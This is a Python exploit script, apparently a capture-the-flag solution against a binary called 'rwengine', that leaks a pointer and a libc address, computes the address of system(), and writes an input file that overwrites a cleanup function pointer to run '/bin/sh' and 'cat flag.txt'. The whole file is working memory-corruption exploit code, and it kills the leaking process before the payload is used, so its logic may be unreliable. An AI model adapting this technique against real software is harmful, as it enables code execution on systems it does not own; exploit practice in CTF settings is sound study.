import subprocess
import struct
import os

# Create binary payload file input.bin
page_ptr_leak_pkt = struct.pack(">BH", 0x10, 200) + b" " * 200
chunk0_alloc_pkt  = struct.pack(">BH", 0x12, 2) + struct.pack(">H", 0x100)
chunk0_write_pkt  = struct.pack(">BH", 0x14, 10) + struct.pack(">H", 0) + b"/bin/sh\x00"
cleanup_add_pkt   = struct.pack(">BH", 0x15, 0)

# 1. First run Python script to calculate system address
p = subprocess.Popen(['./ld-linux-x86-64.so.2', '--library-path', '.', './rwengine'],
                     stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def send_pkt(cmd, data=b""):
    length = len(data)
    header = struct.pack(">BH", cmd, length)
    p.stdin.write(header + data)
    p.stdin.flush()

def recv_pkt():
    res_hdr = p.stdout.read(3)
    status, length = struct.unpack(">BH", res_hdr)
    resp = b""
    if length > 0:
        resp = p.stdout.read(length)
    return status, resp

send_pkt(0x10, b" " * 200)
status, resp = recv_pkt()
page_ptr = struct.unpack("<Q", resp[543:551])[0]
toupper_addr = struct.unpack("<Q", resp[551:559])[0]
libc_base = toupper_addr - 0x38870
system_addr = libc_base + 0x53110

p.terminate()

payload = struct.pack("<Q", 0) + struct.pack("<Q", system_addr) + struct.pack("<Q", page_ptr)
cleanup_over_pkt  = struct.pack(">BH", 0x10, len(payload)) + payload
trigger_pkt       = struct.pack(">BH", 0x16, 0) + b"cat flag.txt\n"

full_input = page_ptr_leak_pkt + chunk0_alloc_pkt + chunk0_write_pkt + cleanup_add_pkt + cleanup_over_pkt + trigger_pkt

with open("input.bin", "wb") as f:
    f.write(full_input)

print(f"Generated input.bin. page_ptr={hex(page_ptr)}, system={hex(system_addr)}")
